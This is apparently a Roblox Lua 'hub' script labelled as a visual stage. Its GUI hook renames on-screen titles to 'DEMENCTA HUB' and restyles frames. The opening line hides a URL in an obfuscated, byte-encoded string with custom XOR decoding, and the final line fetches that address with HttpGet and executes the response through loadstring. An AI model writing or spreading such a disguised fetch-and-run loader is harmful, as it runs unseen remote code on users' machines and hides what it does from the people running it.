
--[[ STAGE 2: VISUAL CORE ]]
local d1iEp3eVpUAozkvo3r="\024\038\031\095\108\112\110\031\128\121\040\044\098\046\050\067\068\060\106\112\143\131\144\135\145\083\126\075\092\121\134\082\102\093\104\141\146\166\150\116\097\099\116\123\108\121\162\168\166\163\174\140\141\126\145\130\131\151\152\178\194\142\162\150\148\157\152\203\210\172\160\199\234\171\180\174\180\244\183\185\184\196\194\188\200\207\193\008\195\216\205\206\212\206\216\214\217\220\221\032\228\228\226\039\243\235\232\249\241\244\242\003\244\008\008\251\012\009\015\014\002\075\022\014\029\084\086\107\038\041\039\041\039"local gomp55_YGM07hL7r1hR=230 local RcKoQ2L6JeJhxofAhgnz=132 local MXmtvaPMs3A3y3eubZN_0=0 local zfpwqj7ACpS5SKaJs_Be1X=2 local E04GGtDme2P3=11 local ql5HcAxAl_yxcQ8KWAhCV=true local zkMfhQV1o7lfcq=bit32 and bit32.bxor if not zkMfhQV1o7lfcq then zkMfhQV1o7lfcq=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local KwhvSGoaJnBEgzyUcSw2D0={}for WwhNol0_P2yz07Mj2l5=1,#d1iEp3eVpUAozkvo3r do local zeBxZLzslunNLpsHOtF=string.byte(d1iEp3eVpUAozkvo3r,WwhNol0_P2yz07Mj2l5)local XX75YVIlqPAOuSWBP=(RcKoQ2L6JeJhxofAhgnz+(WwhNol0_P2yz07Mj2l5*zfpwqj7ACpS5SKaJs_Be1X)+E04GGtDme2P3)%256 if MXmtvaPMs3A3y3eubZN_0==0 then zeBxZLzslunNLpsHOtF=(zeBxZLzslunNLpsHOtF-XX75YVIlqPAOuSWBP)%256 KwhvSGoaJnBEgzyUcSw2D0[WwhNol0_P2yz07Mj2l5]=string.char(zkMfhQV1o7lfcq(zeBxZLzslunNLpsHOtF,gomp55_YGM07hL7r1hR))else zeBxZLzslunNLpsHOtF=zkMfhQV1o7lfcq(zeBxZLzslunNLpsHOtF,gomp55_YGM07hL7r1hR)KwhvSGoaJnBEgzyUcSw2D0[WwhNol0_P2yz07Mj2l5]=string.char((zeBxZLzslunNLpsHOtF-XX75YVIlqPAOuSWBP)%256)end end local pTUez6TpXjNxd45iDUrhx=table.concat(KwhvSGoaJnBEgzyUcSw2D0)if ql5HcAxAl_yxcQ8KWAhCV then pTUez6TpXjNxd45iDUrhx=string.reverse(pTUez6TpXjNxd45iDUrhx)end local aYZ9ZvyCNnILMTCl=pTUez6TpXjNxd45iDUrhx
local HubName = "DEMENCTA HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(aYZ9ZvyCNnILMTCl))()
